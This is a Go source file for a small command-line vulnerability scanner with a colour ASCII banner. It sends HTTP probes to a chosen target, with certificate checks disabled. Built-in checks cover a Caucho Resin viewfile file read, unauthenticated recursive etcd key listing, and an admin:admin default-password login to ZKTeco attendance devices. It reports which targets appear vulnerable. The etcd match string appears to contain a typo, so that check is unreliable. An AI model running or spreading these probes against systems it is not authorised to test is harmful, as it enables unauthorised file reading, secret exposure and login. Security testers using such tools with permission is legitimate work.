package main1

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"github.com/fatih/color"
	"os"
)

func main(){
	color.Cyan("              _                                     _                     _       ")
	color.Red("             | |                             _     ( )     _             | |      ")
	color.Yellow("  ____   ____| |__   ___  ____  _____  ___ _| |_   |/    _| |_ ___   ___ | |  ___ ")
	color.Blue(" |    \\ / ___)  _ \\ / _ \\|  _ \\| ___ |/___|_   _)       (_   _) _ \\ / _ \\| | /___)")
	color.Magenta(" | | | | |   | | | | |_| | | | | ____|___ | | |_          | || |_| | |_| | ||___ |")
	color.Green(" |_|_|_|_|   |_| |_|\\___/|_| |_|_____|___/   \\__)          \\__)___/ \\___/ \\_|___/ ")
	fmt.Println("===================================================================================")
	var url string
	var module string
	flag.StringVar(&url,"h","http://www.baidu.com","target: http(s)://shigophilo.github.io")
	flag.StringVar(&module,"m","H2","module: all")
	flag.Parse()
	//将-m参数的内容转换成大写
	module = strings.ToUpper(module)
	pocs := make(map[string]Poc)
	//更新POC需要也在此处增加一个变量
	pocs["H1"] = H1
	pocs["H2"] = H2
	pocs["H3"] = H3
	//获取详细请求数据
	if module != "ALL" {
		method, path, header, body, expression, status, name := getpocinfo(pocs[module])
		gopoc(url, method, path, header, body, expression, status, name)
	}else{
		for key,_ := range pocs{
			method, path, header, body, expression, status, name := getpocinfo(pocs[key])
			gopoc(url, method, path, header, body, expression, status, name)
		}
	}
}

func gopoc(url string,md string , ph string ,hd map[string]string , by string,expression string,status int,name string) {
	var req *http.Request
	//跳过证书校验
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	if md == "POST"{
		req,_ = http.NewRequest("POST",url+ph,strings.NewReader(by))
	}else{
		req,_ = http.NewRequest("GET",url+ph,nil)
	}
	if hd["UserAgent"] != "" {
		req.Header.Set("User-Agent", hd["UserAgent"])
	}
	if hd["Accept"] != ""{
		req.Header.Set("Accept",hd["Accept"])
	}
	if hd["XForwardedFor"] != ""{
		req.Header.Set("XForwardedFor",hd["XForwardedFor"])
	}
	if hd["ContentType"] != ""{
		req.Header.Set("ContentType" , hd["ContentType"] )
	}
	if hd["Referer"] != ""{
		req.Header.Set("Referer",hd["Referer"])
	}
	if hd["AcceptLanguage"] != ""{
		req.Header.Set("AcceptLanguage",hd["AcceptLanguage"])
	}
	if hd["Cookie"] != ""{
		req.Header.Set("Cookie",hd["Cookie"])
	}
	resp,err := client.Do(req)
	if err !=nil {
		fmt.Println("错误:"+url+"不存活"+ err.Error())
		return
	}
	defer resp.Body.Close()
	response, err := ioutil.ReadAll(resp.Body)
	str := string(response)
	if resp.StatusCode == status && strings.Contains(str, expression){
		color.Red(url+":====存在"+ " "+name+ " "+"漏洞====")
	}else{
		fmt.Println(url+":不存在"+name+"漏洞")
	}
}
//获取poc详细信息
func getpocinfo(id Poc)(method string , path string , header map[string]string , body string,expression string,status int,name string){
	method = id.method
	path = id.path
	header = make(map[string]string)
	header["UserAgent"] = id.headers.UserAgent
	header["Accept"] = id.headers.Accept
	header["XForwardedFor"] = id.headers.XForwardedFor
	header["ContentType"] = id.headers.ContentType
	header["Referer"] = id.headers.Referer
	header["AcceptLanguage"] = id.headers.AcceptLanguage
	header["Cookie"] = id.headers.Cookie
	body = id.body
	expression = id.expression
	status = id.status
	name = id.name
	return method,path,header,body,expression,status,name

}
/*
func showpocs(){
	table.Output(H1)
}
*/
type Poc struct {
	name string
	method string
	headers
	path string
	body string
	expression string
	status int
}
type headers struct {
	UserAgent	string
	Accept string
	XForwardedFor string
	ContentType string
	Referer string
	AcceptLanguage string
	Cookie string
}

var H1 = Poc{name:"Caucho Resin viewfile存在远程文件读取",method:"GET",path:"/resin-doc/viewfile/?file=index.jsp",body:"",expression:"百度",status:200,headers:headers{UserAgent:"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"}}
var H2 = Poc{name:"CoreOS ETCD集群API未授权访问漏洞",method:"GET",path:"/v2/keys/?recursive=true",body:"",expression:`"actopn":"get"`,status:200,headers:headers{UserAgent:"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"}}
var H3 =Poc{name:"中控多款考勤机默认口令(admin:admin)",method:"POST",path:"/csl/check",body:"username=admin&userpwd=admin",expression:"",status:200,headers:headers{UserAgent:"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"}}